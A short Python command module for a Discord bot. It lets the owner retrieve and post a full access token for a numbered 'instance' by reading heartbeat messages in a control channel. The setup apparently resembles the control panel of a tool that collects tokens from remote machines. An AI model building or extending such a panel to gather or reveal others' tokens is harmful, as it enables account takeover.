"""
showtoken.py - !showtoken <number>

"""
import re
import discord

OWNER_ID = 981259484691325018
CONTROL_CHANNEL_ID = 1508336791311089874

async def run(client, message, args):
    if message.author.id != OWNER_ID:
        await message.channel.send("Unauthorized.", delete_after=5)
        return
    if not args.strip():
        await message.channel.send("Usage: `!showtoken <number>`")
        return
    try:
        num = int(args.strip())
    except ValueError:
        await message.channel.send("Number must be an integer.")
        return

    instance_map = getattr(client, "_instance_map", {})
    full_id = instance_map.get(num)
    if not full_id:
        await message.channel.send("Run `!list` first to refresh.")
        return

    channel = client.get_channel(CONTROL_CHANNEL_ID)
    if not channel:
        await message.channel.send("Control channel not accessible.")
        return

    async for msg in channel.history(limit=200):
        if f"FULL_ID={full_id}" in msg.content:
            token_match = re.search(r'\[FULL_TOKEN=([^\]]+)\]', msg.content)
            if token_match:
                token = token_match.group(1)
                await message.channel.send(f"**Full token for instance {full_id[:8]}:**\n```\n{token}\n```")
                return
    await message.channel.send("Token not found in heartbeat messages.")
